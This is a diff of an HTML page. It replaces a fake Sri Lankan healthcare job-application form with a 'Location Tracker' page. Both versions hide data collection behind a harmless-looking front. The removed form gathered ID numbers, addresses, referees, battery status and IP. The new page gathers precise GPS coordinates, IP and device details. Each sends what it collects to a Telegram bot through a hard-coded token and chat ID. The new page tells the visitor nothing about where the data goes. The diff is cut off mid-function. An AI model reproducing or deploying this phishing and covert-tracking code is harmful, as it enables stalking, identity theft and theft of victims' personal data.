@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Dodeno Health - Job Application</title>
+  <title>📍 Location Tracker</title>
   <style>
-    /* ===== RESET & BASE ===== */
     * {
       margin: 0;
       padding: 0;
@@ -14,736 +13,136 @@
 
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f4f7fc;
+      background: #f0f4f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
       padding: 20px;
-      color: #1a2a3a;
     }
 
-    .container {
-      max-width: 900px;
-      margin: 0 auto;
+    .card {
+      max-width: 480px;
+      width: 100%;
       background: #ffffff;
-      border-radius: 28px;
-      padding: 30px 35px 40px;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.06);
+      border-radius: 24px;
+      padding: 32px 28px 36px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+      text-align: center;
       border: 1px solid rgba(0, 0, 0, 0.04);
     }
 
-    /* ===== HEADER ===== */
-    .header {
-      text-align: center;
-      border-bottom: 2px solid #eef2f7;
-      padding-bottom: 22px;
-      margin-bottom: 28px;
-    }
+    .card .icon { font-size: 56px; margin-bottom: 12px; }
+    .card h2 { font-size: 24px; color: #1a2a3a; margin-bottom: 6px; }
+    .card .sub { font-size: 14px; color: #6b7a8a; margin-bottom: 20px; }
 
-    .header .company {
-      font-size: 26px;
-      font-weight: 700;
-      color: #0d6e4b;
-      letter-spacing: -0.5px;
-    }
-
-    .header .company span {
-      color: #1a2a3a;
-    }
-
-    .header .sub {
-      font-size: 14px;
-      color: #6b7a8a;
-      margin-top: 4px;
-    }
-
-    .header .role {
-      font-size: 20px;
-      font-weight: 600;
-      color: #1a2a3a;
-      margin-top: 8px;
-    }
-
-    .header .expiry {
-      display: inline-block;
-      background: #fff3e0;
-      color: #b85c00;
-      padding: 6px 18px;
-      border-radius: 30px;
-      font-size: 13px;
-      font-weight: 600;
-      margin-top: 10px;
-      border: 1px solid #ffe0b2;
-    }
-
-    /* ===== QUALIFICATIONS POPUP (Modal) ===== */
-    .modal-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.6);
-      z-index: 9999;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      animation: fadeIn 0.3s ease;
-    }
-
-    .modal-overlay.active {
-      display: flex;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
-    }
-
-    .modal-box {
-      background: #ffffff;
-      max-width: 520px;
-      width: 100%;
-      border-radius: 24px;
-      padding: 32px 30px 28px;
-      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.2);
-      position: relative;
-      max-height: 90vh;
-      overflow-y: auto;
-    }
-
-    .modal-box .close-btn {
-      position: absolute;
-      top: 14px;
-      right: 20px;
-      background: none;
+    .btn-location {
+      background: #0d6e4b;
+      color: #fff;
       border: none;
-      font-size: 28px;
-      color: #888;
+      padding: 14px 40px;
+      font-size: 18px;
+      font-weight: 700;
+      border-radius: 40px;
       cursor: pointer;
+      transition: 0.25s;
+      box-shadow: 0 4px 14px rgba(13, 110, 75, 0.3);
+      width: 100%;
+    }
+
+    .btn-location:hover { background: #0a5640; transform: scale(1.02); }
+    .btn-location:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+    #result {
+      margin-top: 20px;
+      padding: 16px;
+      border-radius: 12px;
+      background: #f8faff;
+      border-left: 4px solid #0d6e4b;
+      text-align: left;
+      font-size: 14px;
+      color: #1a2a3a;
+      display: none;
+      line-height: 1.8;
+      word-break: break-all;
+    }
+
+    #result .label { font-weight: 600; color: #0d6e4b; }
+    #result.error { border-left-color: #d32f2f; background: #fff6f6; }
+
+    #result .map-link {
+      display: inline-block;
+      margin-top: 10px;
+      background: #0d6e4b;
+      color: #fff;
+      padding: 8px 18px;
+      border-radius: 30px;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 13px;
       transition: 0.2s;
     }
 
-    .modal-box .close-btn:hover {
-      color: #d32f2f;
-      transform: rotate(90deg);
-    }
+    #result .map-link:hover { background: #0a5640; }
 
-    .modal-box h3 {
-      font-size: 20px;
-      color: #0d6e4b;
-      margin-bottom: 16px;
-      border-bottom: 2px solid #eef2f7;
-      padding-bottom: 12px;
-    }
-
-    .modal-box ul {
-      list-style: none;
-      padding: 0;
-    }
-
-    .modal-box ul li {
-      font-size: 15px;
-      color: #1a2a3a;
-      padding: 10px 0;
-      border-bottom: 1px solid #f0f4f9;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .modal-box ul li::before {
-      content: "✅";
-      font-size: 16px;
-      color: #0d6e4b;
-    }
-
-    .modal-box .note {
-      margin-top: 16px;
+    #permission-status {
+      margin-top: 12px;
+      padding: 10px;
+      border-radius: 8px;
       font-size: 13px;
-      color: #888;
-      text-align: center;
-      border-top: 1px solid #eef2f7;
-      padding-top: 14px;
-    }
-
-    /* ===== TOGGLE BUTTON ===== */
-    .btn-toggle-qual {
-      background: transparent;
-      border: 2px solid #0d6e4b;
-      color: #0d6e4b;
-      padding: 10px 28px;
-      border-radius: 40px;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.25s;
-      margin-bottom: 24px;
-    }
-
-    .btn-toggle-qual:hover {
-      background: #0d6e4b;
-      color: #fff;
-    }
-
-    /* ===== FORM ===== */
-    .form-section {
-      margin-bottom: 28px;
-      padding-bottom: 22px;
-      border-bottom: 1px solid #eef2f7;
-    }
-
-    .form-section:last-of-type {
-      border-bottom: none;
-      margin-bottom: 0;
-    }
-
-    .form-section h2 {
-      font-size: 18px;
-      font-weight: 600;
-      color: #0d6e4b;
-      margin-bottom: 16px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 16px 24px;
-    }
-
-    .row-3 {
-      display: grid;
-      grid-template-columns: 1fr 1fr 1fr;
-      gap: 16px 20px;
-    }
-
-    .form-group {
-      display: flex;
-      flex-direction: column;
-      gap: 4px;
-    }
-
-    .form-group label {
-      font-size: 13px;
-      font-weight: 600;
-      color: #1a2a3a;
-    }
-
-    .form-group label .req {
-      color: #d32f2f;
-      margin-left: 2px;
-    }
-
-    .form-group input,
-    .form-group select,
-    .form-group textarea {
-      padding: 10px 14px;
-      border: 1.5px solid #dce3ed;
-      border-radius: 12px;
-      font-size: 14px;
-      background: #fafcfe;
-      transition: 0.25s;
-      outline: none;
-      font-family: inherit;
-      width: 100%;
-    }
-
-    .form-group input:focus,
-    .form-group select:focus,
-    .form-group textarea:focus {
-      border-color: #0d6e4b;
-      background: #ffffff;
-      box-shadow: 0 0 0 4px rgba(13, 110, 75, 0.08);
-    }
-
-    .form-group textarea {
-      resize: vertical;
-      min-height: 60px;
-    }
-
-    .form-group .error-msg {
-      color: #d32f2f;
-      font-size: 12px;
-      font-weight: 500;
       display: none;
     }
 
-    .form-group.error input,
-    .form-group.error select,
-    .form-group.error textarea {
-      border-color: #d32f2f;
-      background: #fff6f6;
-    }
-
-    .form-group.error .error-msg {
+    #permission-status.success {
       display: block;
+      background: #d4edda;
+      color: #155724;
     }
 
-    .btn-submit {
-      width: 100%;
-      background: #0d6e4b;
+    #permission-status.error {
+      display: block;
+      background: #f8d7da;
+      color: #721c24;
+    }
+
+    #permission-status.info {
+      display: block;
+      background: #cce5ff;
+      color: #004085;
+    }
+
+    .retry-btn {
+      background: #dc3545;
       color: #fff;
       border: none;
-      padding: 16px;
-      font-size: 18px;
-      font-weight: 700;
-      border-radius: 40px;
+      padding: 8px 20px;
+      border-radius: 30px;
+      font-size: 13px;
+      font-weight: 600;
       cursor: pointer;
-      transition: 0.25s;
-      margin-top: 16px;
-      box-shadow: 0 6px 20px rgba(13, 110, 75, 0.25);
+      margin-top: 10px;
+      transition: 0.2s;
     }
 
-    .btn-submit:hover {
-      background: #0a5640;
-      transform: scale(1.01);
-    }
-
-    .btn-submit:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .container {
-        padding: 18px 16px 28px;
-      }
-      .row {
-        grid-template-columns: 1fr;
-      }
-      .row-3 {
-        grid-template-columns: 1fr;
-      }
-      .header .company {
-        font-size: 22px;
-      }
-    }
+    .retry-btn:hover { background: #c82333; }
 
     @media (max-width: 480px) {
-      body {
-        padding: 10px;
-      }
-      .container {
-        padding: 14px 12px 22px;
-        border-radius: 18px;
-      }
-      .modal-box {
-        padding: 24px 18px 20px;
-      }
+      .card { padding: 22px 16px 28px; }
+      .btn-location { font-size: 16px; padding: 12px; }
     }
   </style>
 </head>
 <body>
 
-<div class="container">
+<div class="card">
+  <div class="icon">📍</div>
+  <h2>Location Tracker</h2>
+  <div class="sub">Click the button below to get your current location</div>
 
-  <!-- ===== HEADER ===== -->
-  <div class="header">
-    <div class="company">🏥 Dodeno <span>Health Care</span></div>
-    <div class="sub">Your Partner in Mental Wellness</div>
-    <div class="role">📋 Counseling Job Application</div>
-    <div class="expiry">⏳ Applications Close: 31 December 2026</div>
-  </div>
+  <button class="btn-location" id="getLocationBtn">📍 Get My Location</button>
 
-  <!-- ===== TOGGLE BUTTON (Popup) ===== -->
-  <button class="btn-toggle-qual" id="showQualBtn">📌 View Basic Qualifications</button>
-
-  <!-- ============================================================ -->
-  <!-- ===== QUALIFICATIONS POPUP (MODAL) ===== -->
-  <!-- ============================================================ -->
-  <div class="modal-overlay" id="qualModal">
-    <div class="modal-box">
-      <button class="close-btn" id="closeModalBtn">✕</button>
-      <h3>✅ Minimum Requirements</h3>
-      <ul>
-        <li>Bachelor's Degree in Psychology / Counseling</li>
-        <li>Minimum 2 years of counseling experience</li>
-        <li>Excellent communication skills (Sinhala & English)</li>
-        <li>Certified in Mental Health First Aid</li>
-        <li>Ability to work with diverse populations</li>
-        <li>Valid registration with SLPA or equivalent</li>
-        <li>Strong empathy and active listening skills</li>
-      </ul>
-      <div class="note">📌 These are the minimum qualifications required for this position.</div>
-    </div>
-  </div>
-
-  <!-- ============================================================ -->
-  <!-- ===== FORM ===== -->
-  <!-- ============================================================ -->
-  <form id="jobForm" novalidate>
-
-    <!-- ===== SECTION 1 ===== -->
-    <div class="form-section">
-      <h2>1. Personal & Contact Information</h2>
-
-      <div class="row">
-        <div class="form-group">
-          <label>First Name <span class="req">*</span></label>
-          <input type="text" id="firstName" placeholder="e.g. Kaveesha" required />
-          <span class="error-msg">Please enter your first name.</span>
-        </div>
-        <div class="form-group">
-          <label>Last Name <span class="req">*</span></label>
-          <input type="text" id="lastName" placeholder="e.g. Perera" required />
-          <span class="error-msg">Please enter your last name.</span>
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Full Name (with Initials) <span class="req">*</span></label>
-          <input type="text" id="fullName" placeholder="e.g. K.P. Kaveesha Perera" required />
-          <span class="error-msg">Please enter your full name.</span>
-        </div>
-        <div class="form-group">
-          <label>NIC / Passport Number <span class="req">*</span></label>
-          <input type="text" id="nic" placeholder="e.g. 200012345678" required />
-          <span class="error-msg">Please enter NIC / Passport number.</span>
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Email Address <span class="req">*</span></label>
-          <input type="email" id="email" placeholder="kaveesha@email.com" required />
-          <span class="error-msg">Please enter a valid email.</span>
-        </div>
-        <div class="form-group">
-          <label>Phone Number <span class="req">*</span></label>
-          <input type="tel" id="phone" placeholder="071 234 5678" required />
-          <span class="error-msg">Please enter a valid phone number.</span>
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Date of Birth <span class="req">*</span></label>
-          <input type="date" id="dob" required />
-          <span class="error-msg">Please select your date of birth.</span>
-        </div>
-        <div class="form-group">
-          <label>Gender <span class="req">*</span></label>
-          <select id="gender" required>
-            <option value="">Select</option>
-            <option value="Male">Male</option>
-            <option value="Female">Female</option>
-            <option value="Other">Other</option>
-          </select>
-          <span class="error-msg">Please select your gender.</span>
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Marital Status <span class="req">*</span></label>
-          <select id="marital" required>
-            <option value="">Select</option>
-            <option value="Single">Single</option>
-            <option value="Married">Married</option>
-            <option value="Divorced">Divorced</option>
-            <option value="Widowed">Widowed</option>
-          </select>
-          <span class="error-msg">Please select marital status.</span>
-        </div>
-        <div class="form-group">
-          <label>LinkedIn / Portfolio URL</label>
-          <input type="url" id="linkedin" placeholder="https://linkedin.com/in/username" />
-        </div>
-      </div>
-
-      <div class="form-group">
-        <label>Current Address <span class="req">*</span></label>
-        <input type="text" id="address" placeholder="No. 123, Main Street, Colombo" required />
-        <span class="error-msg">Please enter your current address.</span>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Emergency Contact Name <span class="req">*</span></label>
-          <input type="text" id="emergencyName" placeholder="e.g. Sunil Perera" required />
-          <span class="error-msg">Please enter emergency contact name.</span>
-        </div>
-        <div class="form-group">
-          <label>Emergency Contact Number <span class="req">*</span></label>
-          <input type="tel" id="emergencyPhone" placeholder="071 234 5678" required />
-          <span class="error-msg">Please enter emergency contact number.</span>
-        </div>
-      </div>
-      <div class="form-group">
-        <label>Relationship to Emergency Contact <span class="req">*</span></label>
-        <input type="text" id="emergencyRelation" placeholder="e.g. Spouse, Parent, Sibling" required />
-        <span class="error-msg">Please enter relationship.</span>
-      </div>
-    </div>
-
-    <!-- ===== SECTION 2: EDUCATION ===== -->
-    <div class="form-section">
-      <h2>2. Educational Qualifications</h2>
-
-      <div class="form-group">
-        <label>Highest Level of Education Completed <span class="req">*</span></label>
-        <select id="highestEdu" required>
-          <option value="">Select</option>
-          <option value="O/L">O/L</option>
-          <option value="A/L">A/L</option>
-          <option value="Diploma">Diploma</option>
-          <option value="Bachelor's Degree">Bachelor's Degree</option>
-          <option value="Master's Degree">Master's Degree</option>
-          <option value="PhD">PhD</option>
-        </select>
-        <span class="error-msg">Please select highest education level.</span>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>School Attended (Secondary)</label>
-          <input type="text" id="school" placeholder="e.g. Royal College, Colombo" />
-        </div>
-        <div class="form-group">
-          <label>Year of Examination</label>
-          <input type="text" id="examYear" placeholder="e.g. 2018" />
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Degree / Diploma Title <span class="req">*</span></label>
-          <input type="text" id="degreeTitle" placeholder="e.g. B.Sc. in Psychology" required />
-          <span class="error-msg">Please enter degree/diploma title.</span>
-        </div>
-        <div class="form-group">
-          <label>University / Institute <span class="req">*</span></label>
-          <input type="text" id="university" placeholder="e.g. University of Colombo" required />
-          <span class="error-msg">Please enter university/institute name.</span>
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Field of Study / Major <span class="req">*</span></label>
-          <input type="text" id="fieldOfStudy" placeholder="e.g. Clinical Psychology" required />
-          <span class="error-msg">Please enter field of study.</span>
-        </div>
-        <div class="form-group">
-          <label>GPA / Class / Grade</label>
-          <input type="text" id="gpa" placeholder="e.g. First Class, 3.8 GPA" />
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Duration (From) <span class="req">*</span></label>
-          <input type="date" id="eduFrom" required />
-          <span class="error-msg">Please select start date.</span>
-        </div>
-        <div class="form-group">
-          <label>Duration (To) <span class="req">*</span></label>
-          <input type="date" id="eduTo" required />
-          <span class="error-msg">Please select end date.</span>
-        </div>
-      </div>
-    </div>
-
-    <!-- ===== SECTION 3: PROFESSIONAL QUALIFICATIONS ===== -->
-    <div class="form-section">
-      <h2>3. Professional Qualifications & Certifications</h2>
-
-      <div class="form-group">
-        <label>Professional Memberships</label>
-        <input type="text" id="memberships" placeholder="e.g. CIMA, ACCA, SLPA" />
-      </div>
-
-      <div class="form-group">
-        <label>Certifications & Courses</label>
-        <input type="text" id="certifications" placeholder="e.g. PMP, Google Certificate, Mental Health First Aid" />
-      </div>
-
-      <div class="form-group">
-        <label>Technical Skills & Tools</label>
-        <input type="text" id="skills" placeholder="e.g. Excel, Python, AutoCAD" />
-      </div>
-
-      <div class="form-group">
-        <label>Languages Spoken / Written</label>
-        <input type="text" id="languages" placeholder="e.g. Sinhala (Fluent), English (Fluent), Tamil (Basic)" />
-      </div>
-    </div>
-
-    <!-- ===== SECTION 4: WORK EXPERIENCE ===== -->
-    <div class="form-section">
-      <h2>4. Work Experience</h2>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Current / Most Recent Job Title</label>
-          <input type="text" id="jobTitle" placeholder="e.g. Senior Counselor" />
-        </div>
-        <div class="form-group">
-          <label>Company / Organization</label>
-          <input type="text" id="company" placeholder="e.g. ABC Mental Health Center" />
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Employment Period (From)</label>
-          <input type="date" id="workFrom" />
-        </div>
-        <div class="form-group">
-          <label>Employment Period (To)</label>
-          <input type="date" id="workTo" />
-        </div>
-      </div>
-
-      <div class="form-group">
-        <label>Key Responsibilities & Achievements</label>
-        <textarea id="responsibilities" placeholder="Describe your key responsibilities and achievements..."></textarea>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Current Salary (LKR)</label>
-          <input type="text" id="currentSalary" placeholder="e.g. 150,000" />
-        </div>
-        <div class="form-group">
-          <label>Expected Salary (LKR) <span class="req">*</span></label>
-          <input type="text" id="expectedSalary" placeholder="e.g. 200,000" required />
-          <span class="error-msg">Please enter expected salary.</span>
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Notice Period</label>
-          <input type="text" id="noticePeriod" placeholder="e.g. 2 weeks, 1 month" />
-        </div>
-        <div class="form-group">
-          <label>Reason for Leaving</label>
-          <input type="text" id="reasonLeaving" placeholder="e.g. Career growth, Relocation" />
-        </div>
-      </div>
-    </div>
-
-    <!-- ===== SECTION 5: ADDITIONAL QUESTIONS ===== -->
-    <div class="form-section">
-      <h2>5. Additional & Behavioral Questions</h2>
-
-      <div class="form-group">
-        <label>Why do you want this job / Why our company? <span class="req">*</span></label>
-        <textarea id="whyJob" placeholder="Explain why you want to join Dodeno Health Care..." required></textarea>
-        <span class="error-msg">Please answer this question.</span>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Your Strengths</label>
-          <input type="text" id="strengths" placeholder="e.g. Empathy, Active listening, Problem solving" />
-        </div>
-        <div class="form-group">
-          <label>Your Weaknesses</label>
-          <input type="text" id="weaknesses" placeholder="e.g. Overthinking, Public speaking" />
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Willing to Travel / Relocate?</label>
-          <select id="willingTravel">
-            <option value="Yes">Yes</option>
-            <option value="No">No</option>
-            <option value="Maybe">Maybe</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label>Work Authorization / Visa Status</label>
-          <input type="text" id="visaStatus" placeholder="e.g. Citizen, PR, Work Visa" />
-        </div>
-      </div>
-
-      <div class="form-group">
-        <label>Criminal Record / Legal Background?</label>
-        <select id="criminalRecord">
-          <option value="No">No</option>
-          <option value="Yes">Yes</option>
-        </select>
-      </div>
-    </div>
-
-    <!-- ===== SECTION 6: REFEREES ===== -->
-    <div class="form-section">
-      <h2>6. Referees / References</h2>
-
-      <div class="row">
-        <div class="form-group">
-          <label>Referee 1 - Full Name <span class="req">*</span></label>
-          <input type="text" id="ref1Name" placeholder="e.g. Dr. Chaminda Silva" required />
-          <span class="error-msg">Please enter referee 1 name.</span>
-        </div>
-        <div class="form-group">
-          <label>Referee 1 - Job Title & Company <span class="req">*</span></label>
-          <input type="text" id="ref1Title" placeholder="e.g. Senior Psychologist - ABC Hospital" required />
-          <span class="error-msg">Please enter referee 1 title & company.</span>
-        </div>
-      </div>
-      <div class="row">
-        <div class="form-group">
-          <label>Referee 1 - Contact Number <span class="req">*</span></label>
-          <input type="tel" id="ref1Phone" placeholder="071 234 5678" required />
-          <span class="error-msg">Please enter referee 1 contact number.</span>
-        </div>
-        <div class="form-group">
-          <label>Referee 1 - Email <span class="req">*</span></label>
-          <input type="email" id="ref1Email" placeholder="referee1@email.com" required />
-          <span class="error-msg">Please enter referee 1 email.</span>
-        </div>
-      </div>
-      <div class="form-group">
-        <label>Relationship to Candidate <span class="req">*</span></label>
-        <input type="text" id="ref1Relation" placeholder="e.g. Former Supervisor, Lecturer" required />
-        <span class="error-msg">Please enter relationship.</span>
-      </div>
-
-      <hr style="margin: 18px 0; border: 1px dashed #e0e0e0;" />
-
-      <div class="row">
-        <div class="form-group">
-          <label>Referee 2 - Full Name <span class="req">*</span></label>
-          <input type="text" id="ref2Name" placeholder="e.g. Prof. Nimal Rajapaksa" required />
-          <span class="error-msg">Please enter referee 2 name.</span>
-        </div>
-        <div class="form-group">
-          <label>Referee 2 - Job Title & Company <span class="req">*</span></label>
-          <input type="text" id="ref2Title" placeholder="e.g. Head of Department - University of Colombo" required />
-          <span class="error-msg">Please enter referee 2 title & company.</span>
-        </div>
-      </div>
-      <div class="row">
-        <div class="form-group">
-          <label>Referee 2 - Contact Number <span class="req">*</span></label>
-          <input type="tel" id="ref2Phone" placeholder="071 234 5678" required />
-          <span class="error-msg">Please enter referee 2 contact number.</span>
-        </div>
-        <div class="form-group">
-          <label>Referee 2 - Email <span class="req">*</span></label>
-          <input type="email" id="ref2Email" placeholder="referee2@email.com" required />
-          <span class="error-msg">Please enter referee 2 email.</span>
-        </div>
-      </div>
-      <div class="form-group">
-        <label>Relationship to Candidate <span class="req">*</span></label>
-        <input type="text" id="ref2Relation" placeholder="e.g. Academic Advisor, Mentor" required />
-        <span class="error-msg">Please enter relationship.</span>
-      </div>
-    </div>
-
-    <button type="submit" class="btn-submit" id="submitBtn">🚀 Submit Application</button>
-
-  </form>
-
+  <div id="permission-status"></div>
+  <div id="result"></div>
 </div>
 
 <!-- ============================================================ -->
@@ -751,168 +150,207 @@
 <!-- ============================================================ -->
 <script>
   // =============================================
-  // 📌 QUALIFICATIONS POPUP
-  // =============================================
-  const showBtn = document.getElementById('showQualBtn');
-  const modal = document.getElementById('qualModal');
-  const closeBtn = document.getElementById('closeModalBtn');
-
-  showBtn.addEventListener('click', () => {
-    modal.classList.add('active');
-  });
-
-  closeBtn.addEventListener('click', () => {
-    modal.classList.remove('active');
-  });
-
-  modal.addEventListener('click', (e) => {
-    if (e.target === modal) {
-      modal.classList.remove('active');
-    }
-  });
-
-  // =============================================
   // 🔐 TELEGRAM CONFIG
   // =============================================
   const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
   const CHAT_ID   = '8308044531';
 
   // =============================================
-  // 📝 FORM VALIDATION + SUBMIT
+  // 📍 ELEMENTS
   // =============================================
-  document.getElementById('jobForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
+  const btn = document.getElementById('getLocationBtn');
+  const resultDiv = document.getElementById('result');
+  const statusDiv = document.getElementById('permission-status');
 
-    const form = document.getElementById('jobForm');
-    const requiredFields = form.querySelectorAll('[required]');
-    let isValid = true;
-
-    requiredFields.forEach(field => {
-      field.closest('.form-group').classList.remove('error');
-    });
-
-    requiredFields.forEach(field => {
-      if (!field.value.trim()) {
-        field.closest('.form-group').classList.add('error');
-        isValid = false;
-      }
-    });
-
-    const emailField = document.getElementById('email');
-    if (emailField.value.trim() && !emailField.value.includes('@')) {
-      emailField.closest('.form-group').classList.add('error');
-      isValid = false;
-    }
-
-    if (!isValid) {
-      const firstError = document.querySelector('.form-group.error');
-      if (firstError) {
-        firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        firstError.querySelector('input, select, textarea')?.focus();
-      }
+  // =============================================
+  // 🚀 CHECK PERMISSION STATUS ON LOAD
+  // =============================================
+  function checkPermissionStatus() {
+    if (!navigator.permissions) {
+      showStatus('ℹ️ Permission API not supported. Click button to request.', 'info');
       return;
     }
 
-    const submitBtn = document.getElementById('submitBtn');
-    submitBtn.disabled = true;
-    submitBtn.textContent = '⏳ Submitting...';
+    navigator.permissions.query({ name: 'geolocation' })
+      .then((result) => {
+        if (result.state === 'granted') {
+          showStatus('✅ Location permission already granted!', 'success');
+        } else if (result.state === 'denied') {
+          showStatus('❌ Location permission blocked. Please enable in browser settings.', 'error');
+          btn.textContent = '🔒 Permission Blocked';
+          btn.disabled = true;
+        } else {
+          showStatus('ℹ️ Click the button to allow location access.', 'info');
+        }
+      })
+      .catch(() => {
+        // Permission API not supported
+      });
+  }
 
-    // Collect form data (simplified)
-    const getVal = (id) => document.getElementById(id)?.value?.trim() || '—';
-    const fields = {
-      firstName: getVal('firstName'),
-      lastName: getVal('lastName'),
-      fullName: getVal('fullName'),
-      nic: getVal('nic'),
-      email: getVal('email'),
-      phone: getVal('phone'),
-      dob: getVal('dob'),
-      gender: getVal('gender'),
-      marital: getVal('marital'),
-      linkedin: getVal('linkedin'),
-      address: getVal('address'),
-      emergencyName: getVal('emergencyName'),
-      emergencyPhone: getVal('emergencyPhone'),
-      emergencyRelation: getVal('emergencyRelation'),
-      highestEdu: getVal('highestEdu'),
-      school: getVal('school'),
-      examYear: getVal('examYear'),
-      degreeTitle: getVal('degreeTitle'),
-      university: getVal('university'),
-      fieldOfStudy: getVal('fieldOfStudy'),
-      gpa: getVal('gpa'),
-      eduFrom: getVal('eduFrom'),
-      eduTo: getVal('eduTo'),
-      memberships: getVal('memberships'),
-      certifications: getVal('certifications'),
-      skills: getVal('skills'),
-      languages: getVal('languages'),
-      jobTitle: getVal('jobTitle'),
-      company: getVal('company'),
-      workFrom: getVal('workFrom'),
-      workTo: getVal('workTo'),
-      responsibilities: getVal('responsibilities'),
-      currentSalary: getVal('currentSalary'),
-      expectedSalary: getVal('expectedSalary'),
-      noticePeriod: getVal('noticePeriod'),
-      reasonLeaving: getVal('reasonLeaving'),
-      whyJob: getVal('whyJob'),
-      strengths: getVal('strengths'),
-      weaknesses: getVal('weaknesses'),
-      willingTravel: getVal('willingTravel'),
-      visaStatus: getVal('visaStatus'),
-      criminalRecord: getVal('criminalRecord'),
-      ref1Name: getVal('ref1Name'),
-      ref1Title: getVal('ref1Title'),
-      ref1Phone: getVal('ref1Phone'),
-      ref1Email: getVal('ref1Email'),
-      ref1Relation: getVal('ref1Relation'),
-      ref2Name: getVal('ref2Name'),
-      ref2Title: getVal('ref2Title'),
-      ref2Phone: getVal('ref2Phone'),
-      ref2Email: getVal('ref2Email'),
-      ref2Relation: getVal('ref2Relation')
-    };
-
-    // Device info
-    const deviceInfo = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      screen: `${screen.width}x${screen.height}`,
-      memory: navigator.deviceMemory || 'Unknown',
-      cores: navigator.hardwareConcurrency || 'Unknown'
-    };
-
-    let battery = 'Unknown';
-    let charging = 'Unknown';
+  // =============================================
+  // 📤 SEND TO TELEGRAM
+  // =============================================
+  async function sendToTelegram(lat, lon) {
     try {
-      const b = await navigator.getBattery();
-      battery = Math.round(b.level * 100) + '%';
-      charging = b.charging ? '🔌 Charging' : '🔋 Not Charging';
-    } catch (e) {}
+      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      let ip = 'Unknown';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip || 'Unknown';
+      } catch (e) {}
 
-    let ip = 'Unknown';
-    try {
-      const ipRes = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipRes.json();
-      ip = ipData.ip || 'Unknown';
-    } catch (e) {}
+      const ua = navigator.userAgent;
+      const device = ua.match(/Android.*?;\s([^;)\s]+)/)?.[1] || 'Unknown';
+      const os = ua.match(/Android\s([0-9.]+)/)?.[1] || 'Unknown';
 
-    // Build message
-    let msg = `
-📋 **DODENO HEALTH CARE - JOB APPLICATION**
+      const msg = `
+📍 **LOCATION DETECTED**
 
-👤 **Personal & Contact**
-• First Name: ${fields.firstName}
-• Last Name: ${fields.lastName}
-• Full Name: ${fields.fullName}
-• NIC: ${fields.nic}
-• Email: ${fields.email}
-• Phone: ${fields.phone}
-• DOB: ${fields.dob}
-• Gender: ${fields.gender}
-• Marital: ${fields.marital}
-• LinkedIn: ${fields.linkedin}
-• Address: ${fields.address}
-• Emergency: ${fields.emergencyName}
+🌐 IP: ${ip}
+📱 Device: ${device}
+🧬 OS: ${os}
+🕐 Time: ${new Date().toLocaleString()}
+
+📍 Coordinates:
+Latitude: ${lat}
+Longitude: ${lon}
+
+🗺️ Google Maps:
+${mapsLink}
+      `;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+      });
+
+      showStatus('✅ Location sent to Telegram!', 'success');
+
+    } catch (err) {
+      console.error('Telegram error:', err);
+      showStatus('⚠️ Location saved, but Telegram send failed.', 'error');
+    }
+  }
+
+  // =============================================
+  // 📍 GET LOCATION
+  // =============================================
+  function getLocation() {
+    // Clear previous
+    resultDiv.style.display = 'none';
+    resultDiv.className = '';
+    statusDiv.style.display = 'none';
+
+    btn.disabled = true;
+    btn.textContent = '⏳ Requesting location...';
+
+    if (!navigator.geolocation) {
+      showStatus('❌ Geolocation is not supported by your browser.', 'error');
+      btn.disabled = false;
+      btn.textContent = '📍 Get My Location';
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      // ✅ Success
+      async (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
